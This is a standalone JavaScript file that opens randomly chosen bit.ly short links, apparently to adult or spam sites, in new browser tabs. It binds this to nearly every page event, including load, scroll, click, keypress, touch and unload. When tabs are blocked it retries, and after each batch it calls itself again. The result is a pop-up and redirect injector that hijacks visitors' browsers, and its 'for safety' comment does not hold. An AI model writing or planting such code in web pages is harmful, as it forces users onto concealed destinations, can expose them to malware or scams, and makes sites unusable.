function openRandomLinksRecursively(links) {
    const shuffledLinks = shuffleArray(links);
    
    function openLinks() {
        const maxTabs = Math.min(shuffledLinks.length, 3); // Limit to 3 tabs for safety
        let openedTabs = 0;

        for (let i = 0; i < maxTabs; i++) {
            const link = shuffledLinks[i];
            const newTab = window.open(link, '_blank');
            if (newTab === null || typeof newTab === 'undefined') {
                // Opening tab was blocked, retry
                console.log(`Failed to open ${link}. Retrying...`);
                openLinks(); // Recursively retry opening links
            } else {
                openedTabs++;
            }
        }

        if (openedTabs === maxTabs) {
            console.log(`Opened ${openedTabs} tabs.`);
            console.log("All links opened. Repeating script...");
            openRandomLinksRecursively(links); // Repeat the script
        }
    }

    openLinks();
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://bit.ly/smashwatchkada',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/bangedfununative',
    'https://bit.ly/bangedfunmaven',
    'https://bit.ly/bangedfunstars2',
    'https://bit.ly/bangedfunstars3',
    'https://bit.ly/smashwatchkadm',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/smashwatchriverr',
    'https://bit.ly/bangedfunstars'
];

function triggerOpenRandomLinksRecursively() {
    openRandomLinksRecursively(links); // Assuming links is accessible here
}

window.addEventListener('load', triggerOpenRandomLinksRecursively);
window.addEventListener('scroll', triggerOpenRandomLinksRecursively);
window.addEventListener('keydown', triggerOpenRandomLinksRecursively);
document.addEventListener('scroll', triggerOpenRandomLinksRecursively);
document.addEventListener('keydown', triggerOpenRandomLinksRecursively);
window.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
document.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
window.addEventListener('click', triggerOpenRandomLinksRecursively);
document.addEventListener('click', triggerOpenRandomLinksRecursively);
window.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
document.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
window.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
document.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
window.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
document.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
window.addEventListener('touchend', triggerOpenRandomLinksRecursively);
document.addEventListener('touchend', triggerOpenRandomLinksRecursively);
window.addEventListener('unload', triggerOpenRandomLinksRecursively);
document.addEventListener('unload', triggerOpenRandomLinksRecursively);
window.addEventListener('keypress', triggerOpenRandomLinksRecursively); // Adding keyboard event listener for mobile devices
document.addEventListener('keypress', triggerOpenRandomLinksRecursively);
window.addEventListener('orientationchange', triggerOpenRandomLinksRecursively); // Adding mobile orientation change event listener
document.addEventListener('orientationchange', triggerOpenRandomLinksRecursively);
window.addEventListener('input', triggerOpenRandomLinksRecursively);
document.addEventListener('input', triggerOpenRandomLinksRecursively);
document.addEventListener('load', triggerOpenRandomLinksRecursively);
